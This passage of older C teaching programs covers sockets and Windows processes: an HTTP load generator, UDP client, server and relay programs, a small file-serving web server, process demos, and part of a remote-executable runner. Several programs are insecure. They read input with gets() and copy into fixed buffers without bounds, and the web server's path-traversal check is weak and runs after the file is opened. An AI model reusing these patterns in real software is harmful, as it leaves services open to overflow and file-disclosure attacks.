  printf("  GET string              = %s \n", GET_STRING);

  // Start timing
  ftime(&start);

  // Do NUM_GET GETs
  Count = Num = 0;
  for (i=0; i<NUM_GET; i++)
  {
    Count++;
    if (_beginthread(do_get, 4096, (void *)i) < 0)
    {
      printf("ERROR - Unable to create thread \n");
      exit(1);
    }
  }

  // Wait for all threads to finish
  while(Count);

  // Stop timing and compute elapsed time
  ftime(&stop);
  elapsed=((double) stop.time + ((double) stop.millitm * 0.001)) -
          ((double) start.time + ((double) start.millitm * 0.001));

  // Output elapsed time
  printf("  Elapsed time            = %7.3f millisec \n", 1000.0 * elapsed);
  printf("---------------------------------------------------------------\n");

  // Clean-up WSA stuff
  WSACleanup();
}

//=  Thread function to do a get                                            =
void do_get(void *in_arg)
{
  unsigned int         server_s;             // Server socket descriptor
  struct sockaddr_in   server_addr;          // Server Internet address
  char                 out_buf[BUF_SIZE];    // Output buffer for GET request
  char                 in_buf[BUF_SIZE];     // Input buffer for response
  int                  retcode;              // Return code
  int                  i;                    // Loop counter

  // Create a socket
  server_s = socket(AF_INET, SOCK_STREAM, 0);
  if (server_s < 0)
  {
    Count--;
    printf("*** ERROR - socket() failed (%d) \n", WSAGetLastError());
    _endthread();
    exit(1);
  }

  // Fill-in the Web server socket's address information
  server_addr.sin_family = AF_INET;                 // Address family to use
  server_addr.sin_port = htons(PORT_NUM);           // Port num to use
  server_addr.sin_addr.s_addr = inet_addr(IP_ADDR); // IP address to use

  // Do a connect (connect() blocks)
  retcode = connect(server_s, (struct sockaddr *)&server_addr,
                    sizeof(server_addr));
  if (retcode != 0)
  {
    Count--;
    printf("*** ERROR - connect() failed (%d) \n", WSAGetLastError());
    _endthread();
    exit(1);
  }

  // Send a GET to the Web server
  strcpy(out_buf, GET_STRING);
  send(server_s, out_buf, strlen(out_buf), 0);

  // Receive from the Web server
  //  - The return code from recv() is the number of bytes received
  retcode = recv(server_s, in_buf, BUF_SIZE, 0);
  while ((retcode > 0) || (retcode == -1))
  {
    if (retcode == -1)
    {
      Count--;
      printf("*** ERROR - recv() failed (%d) \n", WSAGetLastError());
      _endthread();
      exit(1);
    }
    retcode = recv(server_s, in_buf, BUF_SIZE, 0);
  }

  // Decrement for a completed thread
  Count--;

  // Output GET finished (comment this out for better performance)
  // printf("  GET finished -- %d \n", Num++);

  // Close all open sockets and end the thread
  closesocket(server_s);
  _endthread();
}

/*_______________ timeit.c _______________*/

//=  Program to demonstrate timing of program exectution                    =
//=    1) This program conditionally compiles for Windows and UNIX.         =
//=       Set the initial #define to WIN or UNIX as appropriate.            =
//=    2) Input is prompted from user (to enter their name)                 =
//=    3) Output is to stdout                                               =
//=    4) The accuracy of this program is dependent on the platform.        =
//=       but is approximately 1 millisecond.                               =
//=    5) The timeb structure in ftime.h keeps track of the number of       =
//=       seconds and milliseconds since January 1, 1970.                   =
//=    6) The timeb structure is supported in UNIX and Windows systems,     =
//=       but is not ANSI C.  The ANSI C way (but, not supported on         =
//=       UNIX!) is to use clock() and the clock_t type in time.h           =
//= Example execution:                                                      =
//=                                                                         =
//=  ----------------------------------------------- timeit.c -----         =
//=    Enter your full name =====> Ken C.                                   =
//=    Your name is Ken C. and it took   1.966 sec to execute this program  =
//=  ---------------------------------------------------------------        =
//=  Build: gcc timeit.c, bcc32 timeit.c, cl timeit.c                       =
//=  Execute: timeit                                                        =
//=          Chi-ming Chao                                                  =
//=          http://www.csee.usf.edu/~cchao                                 =
//=          E-mail: cchao@csee.usf.edu                                     =
//=           CMC (04/01/99) - Made it portable to UNIX system              =
#define  WIN                // WIN for Windows and UNIX for Unix

#include <stdio.h>          // Needed for printf()
#ifdef WIN
#include <sys\timeb.h>      // Needed for ftime() and timeb structure
#endif
#ifdef UNIX
#include <sys/timeb.h>      // Needed for ftime() and timeb structure
#endif

//=  Main program                                                           =
void main(void)
{
  char         name[255];   // String for name
  struct timeb start, stop; // Start and stop times structures
  double       elapsed;     // Elapsed time in seconds

  // Output a banner
  printf("----------------------------------------------- timeit.c -----\n");

  // Start timing
  ftime(&start);

  // Prompt for user input while timing
  printf("  Enter your full name =====> ");
  gets(name);
  printf("\n");

  // Stop timing and compute elapsed time
  ftime(&stop);
  elapsed=((double) stop.time + ((double) stop.millitm * 0.001)) -
          ((double) start.time + ((double) start.millitm * 0.001));

  // Output name and elapsed time
  printf("  Your name is %s and it took %7.3f sec to execute this program \n",
    name, elapsed);
  printf("---------------------------------------------------------------\n");
}

/*_______________ udpclient1.c _______________*/

//=  A message "client" program to demonstrate sockets programming            =
//=   - UDP/IP client/server model is implemented                             =
//=    1) This program conditionally compiles for Winsock and BSD sockets.    =
//=       Set the initial #define to WIN or BSD as appropriate.               =
//=    2) There is *no* error checking in this program.  Error checking was   =
//=       omitted to simplify the program.                                    =
//=    3) This program needs server1 to be running on another host.  Program  =
//=       server1 should be started first.                                    =
//=    4) This program assumes that the server1 has the IP address hardcoded  =
//=       into "#define IP_ADDR"                                              =
//=    5) The steps #'s correspond to lecture topics.                         =
//=  Build: bcc32 client1.c or cl client1.c wsock32.lib for Winsock           =
//=         gcc client1.c -lsocket -lnsl for BSD                              =
//=            KJC (05/20/03) - Updated socket naming to match Kurose et al.  =
#define  WIN                // WIN for Winsock and BSD for BSD sockets

#include <stdio.h>          // Needed for printf()
#include <string.h>         // Needed for memcpy() and strcpy()
#ifdef WIN
  #include <windows.h>      // Needed for all Winsock stuff
#endif
#ifdef BSD
  #include <sys/types.h>    // Needed for system defined identifiers.
  #include <netinet/in.h>   // Needed for internet address structure.
  #include <sys/socket.h>   // Needed for socket(), bind(), etc...
  #include <arpa/inet.h>    // Needed for inet_ntoa()
  #include <fcntl.h>        // Needed for sockets stuff
  #include <netdb.h>        // Needed for sockets stuff
#endif

#define  PORT_NUM           1050  // Port number used
#define  IP_ADDR "131.247.166.56" // IP address of server1 (*** HARDWIRED ***)

void main(void)
{
#ifdef WIN
  WORD wVersionRequested = MAKEWORD(1,1);       // Stuff for WSA functions
  WSADATA wsaData;                              // Stuff for WSA functions
#endif

  unsigned int         client_s;        // Client socket descriptor
  struct sockaddr_in   server_addr;     // Server Internet address
  int                  addr_len;        // Internet address length
  char                 out_buf[100];    // 100-byte buffer for output data
  char                 in_buf[100];     // 100-byte buffer for input data

#ifdef WIN
  // This stuff initializes winsock
  WSAStartup(wVersionRequested, &wsaData);
#endif

  // >>> Step #1 <<<
  // Create a socket
  //   - AF_INET is Address Family Internet and SOCK_DGRAM is datagram
  client_s = socket(AF_INET, SOCK_DGRAM, 0);

  // >>> Step #2 <<<
  // Fill-in server1 socket's address information
  server_addr.sin_family      = AF_INET;            // Address family to use
  server_addr.sin_port        = htons(PORT_NUM);    // Port num to use
  server_addr.sin_addr.s_addr = inet_addr(IP_ADDR); // IP address to use

  // Assign a message to buffer out_buf
  strcpy(out_buf, "Test message from client1 to server1");

  // >>> Step #3 <<<
  // Now send the message to server1.  The "+ 1" is for the end-of-string
  // delimiter
  sendto(client_s, out_buf, (strlen(out_buf) + 1), 0,
    (struct sockaddr *)&server_addr, sizeof(server_addr));

  // >>> Step #4 <<<
  // Wait to receive a message
  addr_len = sizeof(server_addr);
  recvfrom(client_s, in_buf, sizeof(in_buf), 0,
    (struct sockaddr *)&server_addr, &addr_len);

  // Output the received message
  printf("Message received is: '%s' \n", in_buf);

  // >>> Step #5 <<<
  // Close all open sockets
#ifdef WIN
  closesocket(client_s);
#endif
#ifdef BSD
  close(client_s);
#endif

#ifdef WIN
  // This stuff cleans-up winsock
  WSACleanup();
#endif
}

/*_______________ udprelay.c _______________*/

//=  A unicast UDP relay/reflector for Windoes or Unix                       =
//=    1) Conditionally compiles for Winsock and BSD sockets.  Manually      =
//=       set the initial #define to WIN or BSD as appropriate.              =
//=    2) Relects or relays as manually set in #define MODE                  =
//=    3) For #define MODE RELAY, IP address must be entered manually        =
//=    4) For #deffine MODE REFLECT, port numbers must be entered manually   =
//=  Build: bcc32 udprelay.c or cl udprelay.c wsock32.lib for Winsock        =
//=         gcc udprelay.c -lsocket -lnsl for BSD                            =
//=            JNS (06/19/02) - Updated, fixed REFLECT and RELAY             =
#define  WIN                // WIN for Winsock and BSD for BSD sockets

#include <stdio.h>          // Needed for printf()
#include <stdlib.h>         // Needed for memcpy()
#include <string.h>         // Needed for strcpy()
#ifdef WIN
  #include <windows.h>      // Needed for all Winsock stuff
#endif
#ifdef BSD
  #include <sys/types.h>    // Needed for system defined identifiers.
  #include <netinet/in.h>   // Needed for internet address structure.
  #include <sys/socket.h>   // Needed for socket(), bind(), etc...
  #include <arpa/inet.h>    // Needed for inet_ntoa()
  #include <fcntl.h>
  #include <netdb.h>
#endif

#define FALSE        0  // Boolean false
#define TRUE         1  // Boolean true
#define RELAY        0  // Define for relay function
#define REFLECT      1  // Define for reflector function

#define VERBOSE   TRUE                    // Verbose mode (TRUE or FALSE)
#define MODE      REFLECT                 // Define REFLECT or RELAY

#define PORT_NUM_FROM    1056             // Port number client sends to
#define PORT_NUM_TO      1050             // Port number client receives from
#define RELAY_IP_ADDRESS "131.247.3.230"  // IP to relay to

void main(void)
{
#ifdef WIN
  WORD wVersionRequested = MAKEWORD(1,1);       // Stuff for WSA functions
  WSADATA wsaData;                              // Stuff for WSA functions
#endif

  unsigned int         server_s;      // Server socket descriptor
  struct sockaddr_in   server_addr;   // Server Internet address
  struct sockaddr_in   client_addr;   // Client Internet address
  struct in_addr       recv_ip_addr;  // Received IP address
  int                  addr_len;      // Internet address length
  int                  retcode;       // Return code
  char                 buffer[8192];  // Datagram buffer
  int                  i;             // Loop counter

#ifdef WIN
  // This stuff initializes winsock
  WSAStartup(wVersionRequested, &wsaData);
#endif

  // Create my (server) socket and fill-in address information
  server_s = socket(AF_INET, SOCK_DGRAM, 0);
  server_addr.sin_family = AF_INET;
  server_addr.sin_port = htons(PORT_NUM_FROM);
  server_addr.sin_addr.s_addr = htonl(INADDR_ANY);
  bind(server_s, (struct sockaddr *)&server_addr, sizeof(server_addr));

  // Fill-in client's socket information
  client_addr.sin_family = AF_INET;

  // Set addr_len
  addr_len = sizeof(client_addr);

  // Reflect or relay UDP datagrams forever
  if (MODE == REFLECT)
    printf("BEGIN reflecting packets... \n");
  else
    printf("BEGIN relaying packets... \n");
  while(TRUE)
  {
    // Receive a datagram
    retcode = recvfrom(server_s, buffer, sizeof(buffer), 0,
      (struct sockaddr *)&client_addr, &addr_len);

    // Save client address for VERBOSE output
    recv_ip_addr = client_addr.sin_addr;

    // Replace client address with source address if reflecting
    if (MODE == REFLECT)
    {
      // Change the port number
      client_addr.sin_port = htons(PORT_NUM_TO);
    }
    else if (MODE == RELAY)
    {
      // Insert the relay IP address
      client_addr.sin_addr.s_addr = inet_addr(RELAY_IP_ADDRESS);
    }

    // Output buffer if verbose is true
    if (VERBOSE == TRUE)
    {
      printf("----------------------------------------------------------- \n");
      printf("Source = %s   ", inet_ntoa(recv_ip_addr));
      printf("Dest = %s \n", inet_ntoa(client_addr.sin_addr));
      printf("Buffer = ");
      for (i=0; i<retcode; i++)
        printf("%02X", buffer[i]);
      printf("\n");
    }

    // Send the datagram
    sendto(server_s, buffer, retcode, 0, (struct sockaddr *)&client_addr,
           sizeof(client_addr));
  }

  // Close and clean-up
#ifdef WIN
  closesocket(server_s);
  WSACleanup();
#endif
#ifdef BSD
  close(server_s);
#endif
}

/*_______________ udpserver1.c _______________*/

//=  A message "server" program to demonstrate sockets programming           =
//=   - UDP/IP client/server model is implemented                            =
//=    1) This program conditionally compiles for Winsock and BSD sockets.   =
//=       Set the initial #define to WIN or BSD as appropriate.              =
//=    2) There is *no* error checking in this program.  Error checking was  =
//=       omitted to simplify the program.                                   =
//=    3) This program serves a message to program client1 running on        =
//=       another host.                                                      =
//=    4) This program assumes that the client1 has the IP address hardcoded =
//=       into "#define IP_ADDR"                                             =
//=    5) The steps #'s correspond to lecture topics.                        =
//=  Build: bcc32 server1.c or cl server1.c wsock32.lib for Winsock          =
//=         gcc server1.c -lsocket -lnsl for BSD                             =
#define  WIN                // WIN for Winsock and BSD for BSD sockets

#include <stdio.h>          // Needed for printf()
#include <string.h>         // Needed for memcpy() and strcpy()
#ifdef WIN
  #include <windows.h>      // Needed for all Winsock stuff
#endif
#ifdef BSD
  #include <sys/types.h>    // Needed for system defined identifiers.
  #include <netinet/in.h>   // Needed for internet address structure.
  #include <sys/socket.h>   // Needed for socket(), bind(), etc...
  #include <arpa/inet.h>    // Needed for inet_ntoa()
  #include <fcntl.h>        // Needed for sockets stuff
  #include <netdb.h>        // Needed for sockets stuff
#endif

#define  PORT_NUM           1050  // Port number used
#define  IP_ADDR "131.247.166.56" // IP address of server1 (*** HARDWIRED ***)

void main(void)
{
#ifdef WIN
  WORD wVersionRequested = MAKEWORD(1,1);       // Stuff for WSA functions
  WSADATA wsaData;                              // Stuff for WSA functions
#endif

  unsigned int         server_s;        // Server socket descriptor
  struct sockaddr_in   server_addr;     // Server1 Internet address
  struct sockaddr_in   client_addr;     // Client1 Internet address
  int                  addr_len;        // Internet address length
  char                 out_buf[100];    // 100-byte buffer for output data
  char                 in_buf[100];     // 100-byte buffer for input data
  long int             i;               // Loop counter

#ifdef WIN
  // This stuff initializes winsock
  WSAStartup(wVersionRequested, &wsaData);
#endif

  // >>> Step #1 <<<
  // Create a socket
  //   - AF_INET is Address Family Internet and SOCK_DGRAM is datagram
  server_s = socket(AF_INET, SOCK_DGRAM, 0);

  // >>> Step #2 <<<
  // Fill-in my socket's address information
  server_addr.sin_family      = AF_INET;            // Address family to use
  server_addr.sin_port        = htons(PORT_NUM);    // Port number to use
  server_addr.sin_addr.s_addr = htonl(INADDR_ANY);  // Listen on any IP address
  bind(server_s, (struct sockaddr *)&server_addr, sizeof(server_addr));

  // >>> Step #3 <<<
  // Fill-in client1 socket's address information
  client_addr.sin_family      = AF_INET;            // Address family to use
  client_addr.sin_port        = htons(PORT_NUM);    // Port num to use
  client_addr.sin_addr.s_addr = inet_addr(IP_ADDR); // IP address to use

  // >>> Step #4 <<<
  // Wait to receive a message from client1
  addr_len = sizeof(client_addr);
  recvfrom(server_s, in_buf, sizeof(in_buf), 0,
    (struct sockaddr *)&client_addr, &addr_len);

  // Output the received message
  printf("Message received is: '%s' \n", in_buf);

  // Assign a message to buffer out_buf
  strcpy(out_buf, "Reply message from server1 to client1");

  // >>> Step #5 <<<
  // Now send the message to client1.  The "+ 1" is for the end-of-string
  // delimiter
  sendto(server_s, out_buf, (strlen(out_buf) + 1), 0,
    (struct sockaddr *)&client_addr, sizeof(client_addr));

  // >>> Step #6 <<<
  // Close all open sockets
#ifdef WIN
  closesocket(server_s);
#endif
#ifdef BSD
  close(server_s);
#endif
#ifdef WIN
  // This stuff cleans-up winsock
  WSACleanup();
#endif
}

/*_______________ weblite.c _______________*/

//=  A super light-weight secure HTTP server for Windows                      =
//=    1) This program conditionally compiles for Winsock and BSD sockets.    =
//=       Set the initial #define to WIN or BSD as appropriate.               =
//=    2) Does not use threads which limits this server to serial             =
//=       connections only.                                                   =
//=    3) Serves HTML, text, and GIF only.                                    =
//=    4) Serves files from directory (and directories below, but not above)  =
//=       that weblite.exe is running in.  This makes weblite "secure".       =
//=    5) Sometimes the browser drops a connection when doing a refresh.      =
//=       This is handled by checking the recv() return code in the           =
//=       function that handles GETs.  This is only seen when using           =
//=       Explorer.                                                           =
//=    6) The 404 HTML message does not always display in Explorer.           =
//=    7) Ignore the compile-time warnings regarding unreachable code         =
//=       in main().                                                          =
//=    8) For Borland C/C++ 5.5 build use bcc32 -WM weblite.c                 =
//=    9) Note that running on port 80 will likely be not allowed on          =
//=       BSD systems.  Another port number (e.g., 1080) should be used.      =
//=  Execution notes:                                                         =
//=   1) Execute this program in the directory which will be the root for     =
//=      all file references (i.e., the directory that is considered at       =
//=      "public.html").                                                      =
//=   2) Open a Web browser and surf to http://xxx.xxx.xxx.xxx/yyy where      =
//=      xxx.xxx.xxx.xxx is the IP address or hostname of the machine that    =
//=      weblite is executing on and yyy is the requested object.             =
//=   3) The only non-error output (to stdout) from weblite is a message      =
//=      with the name of the file currently being sent.                      =
//=  Build: bcc32 weblite.c, gcc weblite.c -lsocket -lnsl                     =
//=  Execute: weblite                                                         =
//=            KJC (01/13/02) - Set listen() listens argument to 1000         =
//=            KJC (06/19/02) - Moved listen() outside of main loop           =
//=            KJC (10/08/02) - Minor clean-up                                =
//=            KJC (12/12/02) - Added back in BSD option                      =
#define  WIN                // WIN for Winsock and BSD for BSD sockets

#include <stdio.h>          // Needed for printf()
#include <stdlib.h>         // Needed for exit()
#include <string.h>         // Needed for memcpy() and strcpy()
#include <fcntl.h>          // Needed for file i/o stuff
#ifdef WIN
  #include <windows.h>      // Needed for all Winsock stuff
  #include <sys\stat.h>     // Needed for file i/o constants
  #include <io.h>           // Needed for file i/o stuff
#endif
#ifdef BSD
  #include <sys/stat.h>     // Needed for file i/o constants
  #include <sys/types.h>    // Needed for system defined identifiers.
  #include <netinet/in.h>   // Needed for internet address structure.
  #include <sys/socket.h>   // Needed for socket(), bind(), etc...
  #include <arpa/inet.h>    // Needed for inet_ntoa()
  #include <netdb.h>        // Needed for network stuff
#endif

#define OK_IMAGE  "HTTP/1.0 200 OK\r\nContent-Type:image/gif\r\n\r\n"
#define OK_TEXT   "HTTP/1.0 200 OK\r\nContent-Type:text/html\r\n\r\n"
#define NOTOK_404 "HTTP/1.0 404 Not Found\r\nContent-Type:text/html\r\n\r\n"
#define MESS_404  "<html><body><h1>File not found</h1></body></html>"

#define  PORT_NUM            1080        // Port number for a Web server
#define  BUF_SIZE            1024        // Buffer size (big enough for a GET)

void handle_get(int client_s);           // Function to handle GET

void main(void)
{
#ifdef WIN
  WORD wVersionRequested = MAKEWORD(1,1);     // Stuff for WSA functions
  WSADATA wsaData;                            // Stuff for WSA functions
#endif

  int                  server_s;             // Server socket descriptor
  struct sockaddr_in   server_addr;          // Server Internet address
  int                  client_s;             // Client socket descriptor
  struct sockaddr_in   client_addr;          // Client Internet address
  struct in_addr       client_ip_addr;       // Client IP address
  int                  addr_len;             // Internet address length

#ifdef WIN
  // This stuff initializes winsock
  WSAStartup(wVersionRequested, &wsaData);
#endif

  // Create a socket, fill-in address information, and then bind it
  server_s = socket(AF_INET, SOCK_STREAM, 0);
  server_addr.sin_family = AF_INET;
  server_addr.sin_port = htons(PORT_NUM);
  server_addr.sin_addr.s_addr = htonl(INADDR_ANY);
  bind(server_s, (struct sockaddr *)&server_addr, sizeof(server_addr));

  // Set-up the listen
  listen(server_s, 1000);

  // Main loop to accept connections and then call function to handle the GET
  printf(">>> weblite is running on port %d <<< \n", PORT_NUM);
  while(1)
  {
    addr_len = sizeof(client_addr);
    client_s = accept(server_s, (struct sockaddr *)&client_addr, &addr_len);
    if (client_s == -1)
    {
      printf("ERROR - Unable to create a socket \n");
      exit(1);
    }
    handle_get(client_s);
  }

#ifdef WIN
  // This stuff cleans-up winsock
  WSACleanup();
#endif
}

//=  This is the function to handle the GET                                 =
void handle_get(int client_s)
{
  char           in_buf[BUF_SIZE];     // Input buffer for GET request
  char           out_buf[BUF_SIZE];    // Output buffer for HTML response
  int            fh;                   // File handle
  int            buf_len;              // Buffer length for file reads
  char           command[BUF_SIZE];    // Command buffer
  char           file_name[BUF_SIZE];  // File name buffer
  int            retcode;              // Return code

  // Receive the (presumed) GET request from the Web browser
  retcode = recv(client_s, in_buf, BUF_SIZE, 0);

  // If the recv() return code is bad then bail-out (see note #3)
  if (retcode <= 0)
  {
    printf("ERROR - Receive failed --- probably due to dropped connection \n");
#ifdef WIN
    closesocket(client_s);
#endif
#ifdef BSD
    close(client_s);
#endif
    return;
  }

  // Parse out the command from the (presumed) GET request and filename
  sscanf(in_buf, "%s %s \n", command, file_name);

  // Check if command really is a GET, if not then bail-out
  if (strcmp(command, "GET") != 0)
  {
    printf("ERROR - Not a GET --- received command = '%s' \n", command);
#ifdef WIN
    closesocket(client_s);
#endif
#ifdef BSD
    close(client_s);
#endif
    return;
  }

  // It must be a GET... open the requested file
  //  - Start at 2nd char to get rid of leading "\"
#ifdef WIN
  fh = open(&file_name[1], O_RDONLY | O_BINARY, S_IREAD | S_IWRITE);
#endif
#ifdef BSD
  fh = open(&file_name[1], O_RDONLY, S_IREAD | S_IWRITE);
#endif

  // If file does not exist, then return a 404 and bail-out
  if (fh == -1)
  {
    printf("File '%s' not found --- sending an HTTP 404 \n", &file_name[1]);
    strcpy(out_buf, NOTOK_404);
    send(client_s, out_buf, strlen(out_buf), 0);
    strcpy(out_buf, MESS_404);
    send(client_s, out_buf, strlen(out_buf), 0);
#ifdef WIN
    closesocket(client_s);
#endif
#ifdef BSD
    close(client_s);
#endif
    return;
  }

  // Check that filename does not start with a "..", "/", "\", or have a ":" in
  // the second position indicating a disk identifier (e.g., "c:").
  //  - This is a security check to prevent grabbing any file on the server
  if (((file_name[1] == '.') && (file_name[2] == '.')) ||
       (file_name[1] == '/') || (file_name[1] == '\\') ||
       (file_name[2] == ':'))
  {
    printf("SECURITY VIOLATION - trying to read file '%s' \n", &file_name[1]);
    close(fh);
#ifdef WIN
    closesocket(client_s);
#endif
#ifdef BSD
    close(client_s);
#endif
    return;
  }

  // Generate and send the response
  printf("Sending file '%s' \n", &file_name[1]);
  if (strstr(file_name, ".gif") != NULL)
    strcpy(out_buf, OK_IMAGE);
  else
    strcpy(out_buf, OK_TEXT);
  send(client_s, out_buf, strlen(out_buf), 0);
  while(1)
  {
    buf_len = read(fh, out_buf, BUF_SIZE);
    if (buf_len == 0) break;
    send(client_s, out_buf, buf_len, 0);
  }

  // Close the file and close the client socket
  close(fh);
#ifdef WIN
  closesocket(client_s);
#endif
#ifdef BSD
  close(client_s);
#endif
}

/*_______________ winhello.c _______________*/

//=  Build: bcc32 hello.c, cl hello.c                                       =

#include <stdio.h>      // Needed for printf()
#include <windows.h>    // Needed for Sleep()

void main()
{
  int i;                // Loop counter

  for (i=1; i<=10; i++)
  {
    printf("    Hello World - - - iteration #%d \n", i);
    Sleep(1000);
  }
}

/*_______________ winprocess.c _______________*/

//=  A simple bare-bones example of processes in Windows 9X/NT              =
//=    1) This program demonstrates how processes work                      =
//=    2) This program requires that hello.exe be in the same directory     =
//=    3) This program is only for Windows 9X/NT and compiles with both     =
//=       Borland and Microsoft compilers                                   =
//=    4) Key Win32 API data structures for this program are:               =
//=        - PROCESSINFORMATION                                             =
//=        - STARTUPINFO                                                    =
//=    5) Key Win32 API functions for this program are:                     =
//=        - CreateProcess()                                                =
//=        - GetExitCodeProcess()                                           =
//=        - OpenProcess()                                                  =
//=        - TerminateProcess()                                             =
//= Example execution:                                                      =
//=                                                                         =
//=   Fork a process...                                                     =
//=     >>> The process global id is -184597                                =
//=     Press any key to kill the process...                                =
//=       Hello World - - - iteration #1                                    =
//=       Hello World - - - iteration #2                                    =
//=       Hello World - - - iteration #3                                    =
//=       Hello World - - - iteration #4                                    =
//=       Hello World - - - iteration #5                                    =
//=                                                                         =
//=     Process killed                                                      =
//=   End!                                                                  =
//=                                                                         =
//=  Build: bcc32 process.c                                                 =
//=  Execute: process (with hello.exe in the same directory)                =
//=           AM/KJC (02/24/99) - Changed "%ld" to "%ud" in printf()        =

#include <stdio.h>        // Needed for printf()
#include <windows.h>      // Needed for Sleep() and Win32 API stuff

#define FILE_NAME  "hello.exe"    // Name of program to execute as a process
#define ATTEMPTS           10     // Number of times to try to get ExitCode
#define ATTEMPT_DELAY     100     // Delay in millisec for try to get ExitCode

//=  Main program                                                           =
void main()
{
  PROCESS_INFORMATION ProcInfo;    // Structure for PROCESS_INFORMATION
  STARTUPINFO         StartUpInfo; // Structure for STARTUPINFO
  DWORD               dwResult;    // A double world result variable
  HANDLE              Proc_handle; // Handle for process
  int                 i;           // Loop counter

  // Initialize STARTUPINFO structure
  StartUpInfo.cb = sizeof(STARTUPINFO);

  // Output a banner
  printf("Forking a process... \n");

  // Create the process
  if (!CreateProcess(NULL, FILE_NAME, NULL, NULL, FALSE,
                     CREATE_DEFAULT_ERROR_MODE, NULL, NULL,
                     &StartUpInfo, &ProcInfo))
  {
    printf("*** ERROR - Unable to create the process \n");
    return;
  }

  // Output the process global id
  printf("  >>> The process global id is %lu \n", ProcInfo.dwProcessId);

  // Loop ATTEMPTS time waiting for a STILL_ACTIVE ExitCode
  for(i=0; i<ATTEMPTS; i++)
  {
    GetExitCodeProcess(ProcInfo.hProcess, &dwResult);
    if(dwResult != STILL_ACTIVE)
      Sleep(ATTEMPT_DELAY);
    else
      break;
  }

  // Output an error message if forked process is never found to be active
  if (dwResult != STILL_ACTIVE)
  {
    printf("  *** ERROR - Forked process not active");
    return;
  }

  // Let the forked process run until a key is pressed to continue
  printf("  Press any key to kill the process... \n") ;
  getchar();

  // Get the forked process handle and terminate it
  Proc_handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, ProcInfo.dwProcessId);
  if(!TerminateProcess(Proc_handle, -1))
  {
    printf("  *** ERROR - Error in killing process");
    return;
  }
  printf("  Process killed \n" ) ;

  // All done
  printf("End! \n");
}

/*_______________ winremrunlocal.c _______________*/

//=  Local program to send an executable file to a remote for execution       =
//=   - remote.c is the receiving remote executor                             =
//=    1) This program compiles for Winsock only                              =
//=    2) This program should be run only after starting remote               =
//=  Sample execution (131.247.167.106 is IP address where remote running)+   =
//=                                                                           =
//=    d:\work>local 131.247.167.106 hello.exe outfile.txt                    =
//=    Sending 'hello.exe' to remote server on '131.247.167.106'              =
//=      'hello.exe' is executing on remote server                            =
//=    Execution of 'hello.exe' and transfer of output to 'outfile.txt' done! =
//=  Build: bcc32 local.c                                                     =
//=           Student, Department of Computer Science and Engineering         =
//=            KJC (12/17/98) - Minor clean-up                                =

#include <stdio.h>              // Needed for printf()
#include <stdlib.h>             // Needed for exit()
#include <string.h>             // Needed for memcpy() and strcpy()
#include <windows.h>            // Needed for Sleep() and Winsock stuff
#include <fcntl.h>              // Needed for file i/o constants
#include <sys\stat.h>           // Needed for file i/o constants
#include <io.h>                 // Needed for open(), close(), and eof()

#define  PORT_NUM           1050    // Arbitrary port number for the server
#define  MAX_LISTEN            1    // Maximum number of listens to queue
#define  SIZE                256    // Size in bytes of transfer buffer

void main(int argc, char *argv[])
{
  WORD wVersionRequested = MAKEWORD(1,1); // WSA functions
  WSADATA wsaData;                        // Winsock API data structure

  unsigned int         remote_s;        // Remote socket descriptor
  struct sockaddr_in   remote_addr;     // Remote Internet address
  struct sockaddr_in   server_addr;     // Server Internet address
  unsigned char        bin_buf[SIZE];   // Buffer for file tranfer
  unsigned int         fh;              // File handle
  unsigned int         length;          // Length of buffers transferred
  struct hostent       *host;           // Structure for gethostbyname()
  struct in_addr       address;         // Structure for Internet address
  char                 host_name[256];  // String for host name
  int                  addr_len;        // Internet address length
  unsigned int         local_s;         // Local socket descriptor
  struct sockaddr_in   local_addr;      // Local Internet address
  struct in_addr       remote_ip_addr;  // Remote IP address

  // Check if number of command line arguments is valid
  if (argc !=4)
  {
     printf("  *** ERROR - Must be 'local (host) (exefile) (outfile)'    \n");
     printf("              where host is the hostname *or* IP address    \n");
     printf("              of the host running remote.c, exefile is the  \n");
     printf("              name of the file to be remotely run, and      \n");
     printf("              outfile is the name of the local output file. \n");
     exit(1);
  }

  // Initialization of winsock
  WSAStartup(wVersionRequested, &wsaData);

  // Copy host name into host_name
  strcpy(host_name, argv[1]);

  // Do a gethostbyname()
  host = gethostbyname(argv[1]);
  if (host == NULL)
  {
    printf("  *** ERROR - IP address for '%s' not be found \n", host_name);
    exit(1);
  }

  // Copy the four-byte client IP address into an IP address structure
  memcpy(&address, host->h_addr, 4);

  // Create a socket for remote
  remote_s = socket(AF_INET, SOCK_STREAM, 0);

  // Fill-in the server (remote) socket's address information and connect
  // with the listening server.
  server_addr.sin_family      = AF_INET;            // Address family to use
  server_addr.sin_port        = htons(PORT_NUM);    // Port num to use
  server_addr.sin_addr.s_addr = inet_addr(inet_ntoa(address)); // IP address
  connect(remote_s, (struct sockaddr *)&server_addr, sizeof(server_addr));

  // Open and read *.exe file
  if((fh = open(argv[2], O_RDONLY | O_BINARY, S_IREAD | S_IWRITE)) == -1)
  {
     printf("  EROR - Unable to open file '%s'\n", argv[2]);
     exit(1);
  }

  // Output message stating sending executable file
  printf("Sending '%s' to remote server on '%s' \n", argv[2], argv[1]);

  // Send *.exe file to remote
  while(!eof(fh))
  {
     length = read(fh, bin_buf, SIZE);
     send(remote_s, bin_buf, length, 0);
  }

  // Close the *.exe file that was sent to the server (remote)
  close(fh);

  // Close the socket
  closesocket(remote_s);

  // Cleanup Winsock
  WSACleanup();

  // Output message stating remote is executing
  printf("  '%s' is executing on remote server \n", argv[2]);

  // Delay to allow everything to clean-up
  Sleep(100);

  // Initialization of winsock
  WSAStartup(wVersionRequested, &wsaData);

  // Create a new socket to receive output file from remote server
  local_s = socket(AF_INET, SOCK_STREAM, 0);

  // Fill-in the socket's address information and bind the socket
  local_addr.sin_family      = AF_INET;            // Address family to use
  local_addr.sin_port        = htons(PORT_NUM);    // Port num to use
  local_addr.sin_addr.s_addr = htonl(INADDR_ANY);  // Listen on any IP addr
  bind(local_s, (struct sockaddr *)&local_addr, sizeof(local_addr));

  // Listen for connections (queueing up to MAX_LISTEN)
  listen(local_s, MAX_LISTEN);

  // Accept a connection, the accept will block and then return with
  // remote_addr filled in.
  addr_len = sizeof(remote_addr);
  remote_s = accept(local_s, (struct sockaddr*)&remote_addr, &addr_len);

  // Copy the four-byte client IP address into an IP address structure
  memcpy(&remote_ip_addr, &remote_addr.sin_addr.s_addr, 4);

  // Create and open the output file for writing
  if ((fh=open(argv[3], O_WRONLY | O_CREAT | O_TRUNC | O_BINARY,
               S_IREAD | S_IWRITE)) == -1)
  {
